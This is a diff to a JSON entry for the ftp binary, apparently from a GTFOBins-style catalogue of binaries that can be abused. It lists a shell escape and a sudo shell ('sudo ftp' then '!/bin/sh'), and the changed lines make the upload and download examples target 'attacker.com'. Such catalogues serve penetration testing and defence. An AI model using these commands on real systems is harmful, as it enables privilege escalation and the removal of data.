@@ -2,23 +2,25 @@
   "functions": {
     "shell": [
       {
+        "description": "",
         "code": "ftp\n!/bin/sh\n"
       }
     ],
     "file-upload": [
       {
         "description": "Send local file to a FTP server.",
-        "code": "ftp [host]\nput [file]\n"
+        "code": "RHOST=attacker.com\nftp $RHOST\nput file_to_send\n"
       }
     ],
     "file-download": [
       {
         "description": "Fetch a remote file from a FTP server.",
-        "code": "ftp [host]\nget [file]\n"
+        "code": "RHOST=attacker.com\nftp $RHOST\nget file_to_get\n"
       }
     ],
     "sudo": [
       {
+        "description": "",
         "code": "sudo ftp\n!/bin/sh\n"
       }
     ]
